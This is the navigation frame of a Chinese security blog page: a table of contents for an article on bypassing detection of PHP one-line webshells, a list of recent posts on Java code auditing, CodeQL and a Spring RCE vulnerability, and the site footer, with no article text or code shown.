Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E5%89%8D%E6%8F%90"><span class="toc-number">1.</span> <span class="toc-text">0x00 前提</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%A3%80%E6%B5%8B%E6%83%85%E5%86%B5"><span class="toc-number">2.</span> <span class="toc-text">0x01 检测情况</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-PHP%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">3.</span> <span class="toc-text">0x02 PHP一句话</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2"><span class="toc-number">4.</span> <span class="toc-text">0x03 字符串变换</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7"><span class="toc-number">5.</span> <span class="toc-text">0x04 函数特性</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">自定义函数绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0-%E7%BB%84%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">回调函数+组合绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">数组绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84"><span class="toc-number">9.</span> <span class="toc-text">二维数组</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F"><span class="toc-number">10.</span> <span class="toc-text">可变变量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E5%B9%B2%E6%89%B0"><span class="toc-number">11.</span> <span class="toc-text">0x05 特殊字符干扰</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E4%BD%BF%E7%94%A8%E7%B1%BB%E7%BB%95%E8%BF%87"><span class="toc-number">12.</span> <span class="toc-text">0x06 使用类绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E8%BF%98%E6%9C%89%E4%B8%80%E7%A7%8D%E6%97%A0%E5%AD%97%E6%AF%8D%E7%9A%84%E9%A9%AC"><span class="toc-number">13.</span> <span class="toc-text">0x07 还有一种无字母的马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E6%80%BB%E7%BB%93"><span class="toc-number">14.</span> <span class="toc-text">0x08 总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/05/10/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%20ClassLoader%E5%BA%94%E7%94%A8/" title="Java代码审计： ClassLoader应用"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java代码审计： ClassLoader应用"/></a><div class="content"><a class="title" href="/2022/05/10/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%20ClassLoader%E5%BA%94%E7%94%A8/" title="Java代码审计： ClassLoader应用">Java代码审计： ClassLoader应用</a><time datetime="2022-05-10T08:21:21.000Z" title="发表于 2022-05-10 16:21:21">2022-05-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/22/CodeQL%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/" title="CodeQL基础语法"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CodeQL基础语法"/></a><div class="content"><a class="title" href="/2022/04/22/CodeQL%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/" title="CodeQL基础语法">CodeQL基础语法</a><time datetime="2022-04-22T04:01:39.000Z" title="发表于 2022-04-22 12:01:39">2022-04-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/07/Spring%20Rce%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90CVE-2022-22965/" title="Spring Rce 漏洞分析CVE-2022-22965"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Spring Rce 漏洞分析CVE-2022-22965"/></a><div class="content"><a class="title" href="/2022/04/07/Spring%20Rce%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90CVE-2022-22965/" title="Spring Rce 漏洞分析CVE-2022-22965">Spring Rce 漏洞分析CVE-2022-22965</a><time datetime="2022-04-07T15:20:11.000Z" title="发表于 2022-04-07 23:20:11">2022-04-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/27/%E8%BD%AC%E8%BD%BD%EF%BC%9AGitee%20%E5%9B%BE%E5%BA%8A%20%E5%A4%96%E9%93%BE%E9%97%AE%E9%A2%98%20%E5%A4%84%E7%90%86/" title="转载：Gitee 图床 外链问题 处理"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="转载：Gitee 图床 外链问题 处理"/></a><div class="content"><a class="title" href="/2022/03/27/%E8%BD%AC%E8%BD%BD%EF%BC%9AGitee%20%E5%9B%BE%E5%BA%8A%20%E5%A4%96%E9%93%BE%E9%97%AE%E9%A2%98%20%E5%A4%84%E7%90%86/" title="转载：Gitee 图床 外链问题 处理">转载：Gitee 图床 外链问题 处理</a><time datetime="2022-03-27T10:27:24.000Z" title="发表于 2022-03-27 18:27:24">2022-03-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/03/14/Codeql%20%E7%8E%AF%E5%A2%83%E6%89%8B%E6%A8%A1%E6%89%8B%E6%90%AD%E5%BB%BA%E5%92%8C%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="Codeql 环境手模手搭建和简单使用"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Codeql 环境手模手搭建和简单使用"/></a><div class="content"><a class="title" href="/2022/03/14/Codeql%20%E7%8E%AF%E5%A2%83%E6%89%8B%E6%A8%A1%E6%89%8B%E6%90%AD%E5%BB%BA%E5%92%8C%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/" title="Codeql 环境手模手搭建和简单使用">Codeql 环境手模手搭建和简单使用</a><time datetime="2022-03-14T04:26:04.000Z" title="发表于 2022-03-14 12:26:04">2022-03-14</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Zeo</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
